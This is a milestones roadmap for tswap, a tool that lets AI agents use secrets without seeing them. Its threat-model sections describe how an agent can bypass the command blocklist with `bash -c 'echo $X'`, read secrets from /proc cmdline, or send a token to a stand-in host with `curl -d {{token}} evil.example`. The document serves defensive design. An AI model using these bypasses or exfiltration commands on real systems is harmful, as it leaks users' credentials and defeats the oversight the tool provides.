# Milestones

Where tswap is, and what has to be true before each next step. This file tracks *release
posture* — the phase-by-phase engineering plan lives in `REFACTORING_PLAN.md`, the key model in
`MULTI_MACHINE_KEYING.md`, and the backend status detail in `HARDWARE_BACKENDS.md`.

The organising question is deliberately not "what would be nice to have." It is: **what has to
be true before this stops being a personal tool and becomes something another person can be told
to install?**

---

## Milestone 1 — Crypto hardening + multi-machine v0 (Phase 6 v0) — complete

Everything in this milestone is merged. What it delivered:

- The keyring + per-secret record binary format (#111–#114), per-record HKDF keys with
  size-bucket padding, and deterministic `HMAC(K_names, name)` filenames.
- Per-slot X25519 keypairs (#115), the two-layer slot wrap (#116) and AAD binding of
  `formatVersion`/`vaultId`/`k`/`slotId` (#117) — the format properties that had to be right
  before anything was written to disk, because they cannot be retrofitted.
- `init --keyring` with a random `K_v` and a default-on recovery slot (#119, #120).
- Hand-carried multi-machine enrollment: `slot request` / `approve` / `accept` (#121, #122),
  with fingerprint display and a sudo gate on `approve`.
- Read-only `slots` listing with an honest protection column (#123).
- A vault generation counter that refuses stale saves (#118), durable writes and scan tolerance
  for synced/network-mounted vault directories (#137), and `IVaultStore` keyed by opaque id
  rather than filesystem path (#124).
- Export/import moved to Argon2id with explicit KDF parameters in the file format (#30, #108).

**Remaining:** #125 (the README documenting v0's limitations honestly — format not yet stable,
hand-carry the enrolment files, no revocation yet), and closing the merged-but-open issues above.

Nothing else should be added to this milestone. It is a shipped state, and the value of it being
closeable is the signal it sends: v0 is done, go use it.

---

## Milestone 2 — MVP: usable by someone other than the author

The line this milestone crosses is **personal tool → early-stage usable by others**. That makes
its scope a question of *reach* and *honesty*, not of features.

Scope is judged against tswap's stated purpose, in the order `AGENTS.md:7-8` gives it:
**(1) AI agent safety** — an agent can *use* a secret without *seeing* it — and **(2) YubiKey
redundancy**. Hardware backing is the mechanism for the second, not the point of the tool.

See **`THREAT_MODEL.md`** for the adversary these milestones are scoped against: a helpful AI agent
that gets a bit greedy — one that will do what it can to reach its goal, and leaks secrets by
working normally rather than by attacking. The harm to prevent is the secret entering the model's
context and being remembered. That model is what ranks the work below: failure modes matter in
proportion to how *ordinary* they are, not how clever.

Three things gate it.

### Enforcement — the core claim has to actually hold

These were originally filed as hardening items to be confirmed by dogfooding. They are better
understood as the mediation layer failing at its own stated job.

Be precise about which gaps count, because `README.md` §Design rationale already settles the
general case: the blocklist is **shallow by design**, and `curl`, `python` or a custom binary
exfiltrating a substituted secret is an explicit non-goal, not a bug. What is a bug is the
blocklist being walked around on the cases it exists to catch — `echo` is on the list precisely to
stop an agent printing a secret, and `run -- bash -c 'echo $X'` defeats that. "We don't sandbox" is
not a reason to leave that unfixed.

- **#105** — shell interpreters bypass the `run` exfiltration blocklist. `tswap run -- bash -c
  '…'` walks straight through it.
- **#106** — streaming redaction misses encoded/escaped variants.
- **#71** — secrets substituted into argv are readable from `/proc/<pid>/cmdline` by the very
  agent being mediated. Note the limit found while reviewing it: moving to environment variables
  swaps `cmdline` exposure for `/proc/<pid>/environ` exposure, readable by the same party through
  the same mechanism. Worth doing for `ps aux` by *other* users, shell audit logs, and accidental
  disclosure — not as a fix for this adversary. 1Password's `op run` has the same limitation.

### Two properties, kept apart

The enforcement items above are all about **confidentiality** — can the agent *see* the plaintext.
That is the guarantee `AGENTS.md:7` actually claims, and the mediation layer is what enforces it.

**Capability** — can the agent *cause* a secret to be used — is a different property, gated by
presence (touch, Touch ID, Windows Hello). And the agent being able to unlock is **the feature, not
the threat**: an agent that cannot unlock cannot do its job. Automated and unattended workflows are
legitimate and increasingly the common case, and a vault without presence is not broken — the agent
still cannot read cleartext, because something else enforces that.

So presence is a **mode**, chosen per deployment:

- **Attended** — developer at the machine. Presence adds defence in depth and a per-unlock consent
  signal. Available free on macOS (Secure Enclave, already implemented), free on most Windows
  hardware (Hello, #164), and via a touch-required YubiKey on Linux — a purchase, but that
  population already buys them.
- **Unattended** — CI, automation, background agents. Presence is impossible by definition and the
  mediation layer is the sole control. Supported deliberately, reported factually by `slots`/`init`
  without implying it is unsafe.

**Linux needs nothing built** for this: no Wayland prompt app, no polkit/`systemd-ask-password`
integration, no fprintd work. All were incomplete — none closes prompt forgery, since Wayland has
no secure attention sequence — and all deliver a typed PIN, which is unusable at tswap's access
frequency (unlock runs once per invocation; an agent invokes `run` continuously).

Because presence is optional, the unattended path makes the mediation layer the *only* control —
which is why #105/#106/#71 lead this milestone rather than trail it.

- **#164** — optional presence-gated unlock for TPM via Windows Hello, off by default. Worth having,
  explicitly **not** a gate: shipping without it costs nothing that the enforcement items above do
  not already cover.

### One limit to state honestly

The blocklist is `echo, printf, cat, env, printenv, set, tee` (`Validation.cs:14-15`) checked
against `argv[0]`, plus a pipe/redirect block. That stops the agent reading a secret back. It does
not stop an authorized use from being malicious: `tswap run -- curl -d {{token}} evil.example`
passes every current check. Presence does not close it either — a human cannot tell a legitimate
use from an exfiltrating one.

The claim to make is therefore precise: **the agent does not learn the secret value** — it never
enters the agent's context, logs or output, so it cannot be retained, reused, or shipped to a model
provider. Not "an authorized command can never misuse the secret it was given."

### Reach — Secure Enclave and TPM must be first-class

Today the Phase 6 keyring is YubiKey-only. `init --keyring` cannot combine with
`--secure-enclave` or `--tpm` (`InitCommand.cs:32-34`), and `slot request` runs the YubiKey
challenge/XOR dance inline — so a Mac or a TPM machine cannot join a fleet at all. The machines
that need *no removable token* are precisely the ones currently locked out, and requiring two
YubiKeys is the single largest barrier to anyone else trying this.

The good news is that the hard part is already done. `VaultUnlocker.Unlock`
(`VaultUnlocker.cs:80-88`) is fully backend-agnostic for keyring vaults — its own doc comment
says a second backend "needs no change here at all," and that is accurate. What is missing is
**enrollment**, and one seam asymmetry: YubiKey *derives* `KEK_slot` from hardware, while SE and
TPM *wrap* bytes handed to them. Neither can implement the other's primitive, so the seam has to
abstract "provision this machine's `KEK_slot`," not "wrap."

- **#151** — enrollment seam + `init --keyring --secure-enclave|--tpm`
- **#152** — backend-neutral `slot request`; cross-backend fleets (a Mac, a Linux box and a
  YubiKey workstation sharing one vault — the keyring format already permits this, since `Slot`
  carries no backend tag)
- **#153** — a simulated `IHardwareKeyService` so these paths are testable in CI at all. Today
  `VaultUnlocker`'s `overrideKey` seam is wired only into the YubiKey backend, so without this
  every new SE/TPM path ships with zero automated coverage.
- **#158** — `slots` protection column, security warnings, migrate, and the per-backend threat
  model in the README

### Workflow coverage — the tool has to fit the work people actually do

Reach is not only about hardware. Three gaps stop tswap covering ordinary ops workflows, and each
one currently forces the user onto a path that exposes plaintext — which, per `THREAT_MODEL.md`
§What actually scales, is the definition of a vulnerability under this model: *anywhere the safe
path is harder than the unsafe one*.

- **#165** — ephemeral file-based delivery. `run` covers argv, #71 covers environment; nothing
  covers a tool wanting `--password-file <path>` for one invocation. That is most ops tooling —
  `step ca`, `openssl -passin file:`, `ansible --vault-password-file`, kubeconfig, keyfiles. Today
  the agent either holds the plaintext to write the file itself, or the user pre-places it by hand.
  (`apply` already covers *persistent* config files; this is the per-invocation case.)
- **#170** — `apply` can only replace a whole value, never part of one. Connection strings, DSNs,
  URLs with embedded credentials and bearer headers cannot be expressed at all. A format decision,
  so it needs settling before implementing — and note the inline form would also fix the
  secret-name leakage the README already documents for `helm --debug` and release manifests.
- **#169** — nothing detects plaintext secret values in a file. `check` verifies markers reference
  known secrets; it does not notice that `apply` output got committed. Cheap, because `redact`'s
  matching already does the detection — this is a new exit code over existing machinery, wired into
  a pre-commit hook.

### Adoption — the on-ramp is currently the worst path in the tool

- **#171** — bootstrap an existing project: parse config files, ingest inline plaintext secrets,
  rewrite with markers, with no value crossing into any agent-visible surface. `tocomment` only
  annotates secrets **already in the vault**, so today adoption means either the human transcribes
  every secret by hand or the agent reads the file — the exact leak tswap exists to prevent, at the
  moment someone is adopting it to prevent that leak.

  This is the highest-leverage item in the milestone. Every user who abandons at that fork keeps
  their secrets in plaintext, and they hit it before receiving any benefit from the tool.

### Honesty — the backends must be trustworthy, or plainly labelled

`HARDWARE_BACKENDS.md` is unusually candid about what has and has not been verified. That candour
currently lives in a design document. Before other people rely on these backends it has to be
either resolved or visible in the README.

- **#154** — version the SE/TPM hardware blob wire formats. **This is the time-sensitive one.**
  All three blobs are unversioned; `Models.cs:62-64` states that changing the layout "silently
  breaks every existing Secure Enclave vault," with no detection and no migration path. The
  documented resolution — folding the blobs into the keyring as `hwBlob` — *is* that breaking
  change. Its cost is zero while the only such vaults are the author's, and it rises with every
  user who adopts the backends. Do it before the audience exists, not after.
- **#155 / #156** — verify the Linux and Windows TPM backends against real hardware. Everything
  so far is a swtpm container and a Parallels virtual TPM. A simulator proves the code speaks the
  protocol; it does not prove the hardware root-of-trust property. If physical hardware genuinely
  cannot be obtained, the honest fallback is a prominent README limitation — not silence.
- **#157** — Secure Enclave on Intel/T2 Macs: verify, or gate to Apple Silicon and say so. The
  present state lets a T2 Mac enroll into unknown territory, which risks the worst outcome
  available — appearing to work, then failing to unlock later.
- **#159** — disclose, in the README, that the Swift ECIES construction has had no independent
  cryptographic review. The review itself is post-MVP; the disclosure is not.

### Confidence — dogfooding

- **#160** — sustained two-machine, two-backend, sync-transport use, including actually walking
  the recovery path from the README alone. Phase 6 v0 shipped a lot of machinery verified by
  tests rather than by use.
- **#107** (`SUDO_USER`-derived config directory not validated) and **#42** (concurrent instances
  race on YubiKey access) — the remaining correctness items, distinct from the enforcement gaps
  above.
- Test-coverage gaps worth closing while here: **#46**, **#47**, **#109**.

### What Milestone 2 deliberately excludes

No revocation, no `K_v` rotation, no transport-borne enrolment. An MVP may ship with a
limitation; it may not ship with an *undocumented* one. Every gap above is either closed here or
written down where a user will see it.

---

## Milestone 3 — More than one person, more than one machine

Necessary, and not MVP. The theme is what tswap needs once it serves a team or a fleet rather than
one person on their own machines — properties a long-lived deployment needs, not what a first user
needs to get value on day one.

### Multi-user controls

`THREAT_MODEL.md` §The employee model maps organisational controls onto tswap: role separation (the
sudo boundary), handbook (`tswap prompt`), and incident response (`burn`/`burned`/rotate) all exist.
Two do not, and they are the two that matter most *because* prevention against a motivated agent is
impossible — they bound blast radius and make what happened knowable afterwards.

- **#167** — project labels scoping an agent to a subset of secrets, selected by folder (or env var,
  which may only narrow), with the label list itself not enumerable. The sharp edge is the oracle:
  out-of-scope must be indistinguishable from not-found, or name-guessing maps the whole vault.
  Mapping lives in the vault, sudo to widen — an agent that can edit its own scope has no scope.
- **#168** — an access log. Nothing currently records which secrets were used, when, or by what.
  Against the motivating incident in `THREAT_MODEL.md`, this is the difference between "which
  credentials were touched, on which dates" and "assume the whole vault is exposed."

  **Worth pulling into Milestone 2 if it proves cheap.** Unlike #167 it has real single-user value,
  it is the detection half of a threat model that has already concluded prevention is impossible,
  and it records no secret values so it carries no confidentiality cost.

### Fleet lifecycle (Phase 6 v1)

Ordering is not arbitrary — #126 blocks most of the rest:

- **#126** — resolve rotation atomicity. The largest unanswered design question in Phase 6: a
  partially rotated record directory syncing against a not-yet-rotated copy needs a per-record
  rotation generation, a merge rule tolerating mixed generations, and resumability. This must be
  settled **as a byte-layout decision** before v1 writes a single rotated record. It cannot be
  retrofitted.
- **#128** — fleet revoke: slot removal + `K_v` rotation + re-encryption. The step that makes
  revocation real. Slot removal alone is security theatre — a revoked machine may have cached
  `K_v` or any secret it ever read. Depends on #126 and on the v0 per-slot X25519 keypair.
- **#129** — fleet signing key `K_s` + keyring signature. Resolves the keyring-authenticity
  circularity and gives secondary defence against threshold downgrade.
- **#131** — recovery-slot use forces rotation. The recovery slot is a bare keypair with no PKI
  and structurally cannot be revoked; forcing rotation on use is one of the two things standing
  in for the revocation it cannot offer.
- **#130** — pinned local epoch counter, as defence in depth alongside rotation.
- **#127** — transport-borne enrolment. Note this **reinstates the enrolment fingerprint as the
  primary control** rather than defence in depth: on an untrusted transport a MITM can substitute
  their own public key. Neither Secure Enclave nor TPM helps — hardware attestation proves *some*
  device is involved, not *your* device. Do not ship without the fingerprint UX being genuinely
  load-bearing.
- **#132** — HLC + full LWW/earliest-burn merge rules + commutativity fuzz tests.
- **#133** — TPM PCR policy (boot-state binding). Rescoped: the PIN half moved to #164 in
  Milestone 2, because user interaction is what makes a TPM vault agent-resistant. PCR binding
  defends against offline and boot-level attack, which is defence in depth at the wrong layer for
  the core claim — a correctly-booted machine satisfies the policy by definition, so the agent
  unseals unaided regardless. Also needs a recovery story: PCR values change on firmware and
  kernel updates.
- **#134** — k-of-n threshold *enrolment* (governance of who may extend the fleet). Distinct from
  k-of-n unlock, which `MULTI_MACHINE_KEYING.md` demotes to a rationale note: no independent
  zero-friction second factor exists on any target platform today.

---

## Backlog — deliberately unscheduled

Recorded so they stop being re-litigated, not queued.

- **#161** — Azure Blob Storage vault backend. The one cloud-integration idea that is
  architecturally aligned: records are already individually encrypted under per-record keys with
  HMAC-derived filenames, so a blob container holds opaque blobs with opaque names and the hardware
  root of trust is untouched. `IVaultStore`'s doc comment names this exact case, and #124 landed in
  Milestone 1 to make it possible. Note Azure Blob's ETags offer real compare-and-swap, which is
  strictly better than what #118's generation counter had to infer from sync-folder semantics.
- **#162** — an agent/daemon so VMs and containers share one host tswap instance. Containers are
  currently *unsupported*, not degraded — no TPM, no Secure Enclave, no practical YubiKey
  passthrough, so no route to `K_v` at all. Half the use case (`docker compose up` from the host)
  is covered by #71 with no new surface. Not before #105: do not add a network endpoint while the
  local exfiltration story is unfinished.
- **#163** — decision record on integrating with existing secret stores. Transparent access to
  Bitwarden or Key Vault is strategically right (decoherence between two sources of truth is a real
  adoption killer), subject to one constraint: **tswap must hold the upstream credential such that
  tswap is the only path to it.** An ambient `BW_SESSION` or `az login` lets the agent go around the
  mediation entirely.
- **#166** — `apply --out <file>`. Low priority and possibly to be closed: process substitution
  already avoids both stdout exposure and a temp file, which `--out` does not.

### One component keeps surfacing

A small daemon running as a **different uid** is the answer to four independently-motivated
problems: #162 (containers reach one host instance), #163 (hold an upstream credential where the
agent cannot), #164 (a consent channel the caller cannot observe or forge), and #168
(tamper-evident logging — the agent runs as the same user and can edit a local log).

That is worth designing once, deliberately, rather than four times by accident. It is not MVP, but
whenever the first of those four is built, build it as that component.
